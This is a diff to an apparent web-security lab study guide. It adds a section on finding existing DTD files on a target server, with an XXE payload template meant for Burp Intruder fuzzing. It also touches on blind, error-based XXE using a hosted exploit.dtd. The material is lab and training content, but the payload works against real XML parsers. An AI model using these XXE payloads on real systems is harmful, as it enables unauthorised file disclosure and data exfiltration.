@@ -2867,9 +2867,34 @@ Origin: http://subdomain.TARGET.NET
 
 >**Rabbit hole:** The submit feedback and screenshot upload on feedback is not to be followed by ***Neo*** down the Matrix.  
   
+### Identify Existing DTD Files  
+
+>Reference list of existing DTD fileS on servers [GoSecure dtd-finder dtd_files.txt](https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt)  
+
+The following XML payload in POST body can be used to identify existing DTD files on target server:  
+
+```XML
+<?xml version="1.0" encoding="UTF-8" standalone='no'?>
+<!DOCTYPE skippy [<!ENTITY % peanuts SYSTEM " PAYLOAD_POSITION ">%peanuts; ]>
+<stockCheck>
+ <productId>
+  1
+ </productId>
+ <storeId>
+  1
+ </storeId>
+</stockCheck>
+```  
+
+>Use Burp Intruder with above GoSecure wordlists to find valid DTD files that can be repurposed to ***Exploiting XXE to retrieve data exfil by repurposing a local DTD***  
+
+![xml_identify_existing_dtd_files.png](/images/xml_identify_existing_dtd_files.png)  
+
 ### DTD Blind Error messages  
 
->Trigger XML parsing errors in such a way that the error messages contain sensitive data. If the out of band to Collaborator payload above do not work test if the target will call a ```exploit.dtd``` file with invalid reference and return response in an error message.  
+>Trigger XML parsing errors in such a way that the error messages contain sensitive data.  
+>If the out of band to Collaborator payload above do not work test if the target will call a ```exploit.dtd``` file with invalid reference  
+>and return response in an error message.  
 
 >Hosted on exploit server the ```/exploit.dtd``` file and body contents to ```file:///invalid/``` path.  
 
